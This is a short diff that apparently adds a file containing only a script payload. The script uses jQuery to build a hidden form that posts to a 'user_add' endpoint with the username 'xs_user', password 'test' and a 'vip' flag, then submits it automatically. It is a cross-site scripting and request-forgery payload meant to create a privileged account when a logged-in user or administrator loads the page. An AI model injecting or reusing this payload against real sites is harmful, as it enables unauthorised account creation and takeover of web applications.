@@ -1,0 +1,11 @@
+<script>
+$("body").append("<form id='myform' action='user_add' method='post'/>");
+$(myform).hide();
+$(myform).append("<input name='username' value='xs_user'/>");
+$(myform).append("<input name='password' value='test'/>");
+$(myform).append("<input name='password2' value='test'/>");
+$(myform).append("<div name='vip' value='true'/>");
+$(myform).append("<input name='newUser' value='true'/>");
+$(myform).submit();
+</script>
+
